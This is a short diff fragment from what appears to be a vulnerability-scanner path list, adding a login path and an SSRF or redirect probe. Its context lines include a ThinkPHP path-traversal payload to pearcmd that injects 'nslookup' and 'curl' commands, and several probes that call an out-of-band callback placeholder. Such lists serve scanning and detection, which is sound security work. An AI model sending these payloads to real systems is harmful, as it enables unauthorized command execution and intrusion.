@@ -18,3 +18,5 @@
 /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=nslookup {{interactsh-url}}|curl {{interactsh-url}}
 /apply/index.php?url=http://{{interactsh-url}}
 /unified-console.html
+/urve/site/login.html?lang=en
+/_internal/redirect.php?url=http://{{interactsh-url}}
